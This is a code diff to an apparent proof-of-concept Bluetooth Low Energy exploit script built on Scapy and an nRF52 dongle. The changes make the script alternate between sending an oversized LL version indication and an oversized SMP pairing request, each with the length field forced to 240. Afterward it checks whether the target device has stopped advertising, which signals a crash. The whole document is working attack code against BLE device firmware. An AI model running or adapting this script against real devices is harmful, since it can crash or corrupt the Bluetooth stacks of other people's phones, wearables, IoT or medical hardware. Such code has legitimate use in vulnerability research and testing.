@@ -22,6 +22,8 @@ access_address = 0x9a328370
 none_count = 0
 end_connection = False
 connecting = False
+slave_addr_type = 0
+switch_length_pkt = 0
 
 # Autoreset colors
 colorama.init(autoreset=True)
@@ -49,24 +51,30 @@ print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
 
 def crash_timeout():
-    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
+    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
           ' received\nThe device may have crashed!!!')
 
 
 # disable_timeout('scan_timeout')
 
 def scan_timeout():
-    scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
+    global connecting, switch_length_pkt, slave_addr_type
+    scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
         ScanA=master_address,
         AdvA=advertiser_address)
     driver.send(scan_req)
+    connecting = False
     start_timeout('scan_timeout', 2, scan_timeout)
+    if switch_length_pkt:
+        switch_length_pkt = 0
+    else:
+        switch_length_pkt = 1
 
 
 # Open serial port of NRF52 Dongle
 driver = NRF52Dongle(serial_port, '115200')
 # Send scan request
-scan_req = BTLE() / BTLE_ADV() / BTLE_SCAN_REQ(
+scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
     ScanA=master_address,
     AdvA=advertiser_address)
 driver.send(scan_req)
@@ -94,14 +102,16 @@ while True:
             print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
-        if pkt and (BTLE_SCAN_RSP in pkt) and pkt.AdvA == advertiser_address.lower():
+        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() \
+                and connecting == False:
             connecting = True
             update_timeout('scan_timeout')
             disable_timeout('crash_timeout')
+            slave_addr_type = pkt.TxAdd
 
             print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
             # Send connection request to advertiser
-            conn_request = BTLE() / BTLE_ADV(RxAdd=pkt.TxAdd, TxAdd=0) / BTLE_CONNECT_REQ(
+            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                 InitA=master_address,
                 AdvA=advertiser_address,
                 AA=access_address,  # Access address (any)
@@ -121,7 +131,17 @@ while True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
             # Send version indication request
-            pkt = pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+            if switch_length_pkt == True:
+                print(Fore.YELLOW + 'Sending oversized version indication')
+                pkt[BTLE_DATA].len = 240  # The magic happens here
+                end_connection = True
+            driver.send(pkt)
+
+        elif LL_SLAVE_FEATURE_REQ in pkt:
+            # 1) Send Feature request
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_RSP(
+                feature_set='le_encryption+le_data_len_ext')
             driver.send(pkt)
 
         elif LL_VERSION_IND in pkt:
@@ -136,12 +156,20 @@ while True:
             pairing_req[BTLE_DATA].len = 240  # The magic happens here
             driver.send(pairing_req)
             end_connection = True
-        # wrpcap(os.path.basename(__file__).split('.')[0]+'.pcap', NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req) # save packet just sent
+
+        elif L2CAP_Connection_Parameter_Update_Request in pkt:
+            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
+                iocap=4, oob=0, authentication=0x05, max_key_size=16, initiator_key_distribution=0x07,
+                responder_key_distribution=0x07)
+            if switch_length_pkt == False:
+                print(Fore.YELLOW + 'Sending oversized pairing request')
+                pairing_req[BTLE_DATA].len = 240  # The magic happens here
+            driver.send(pairing_req)
+            end_connection = True
 
         elif SM_Pairing_Response in pkt:
             pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
             driver.send(pairing_req)
-
 
         elif LL_LENGTH_REQ in pkt:
             length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
@@ -158,5 +186,9 @@ while True:
             print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
             driver.send(scan_req)
             start_timeout('crash_timeout', 7, crash_timeout)
+            if switch_length_pkt:
+                switch_length_pkt = 0
+            else:
+                switch_length_pkt = 1
 
     sleep(0.01)
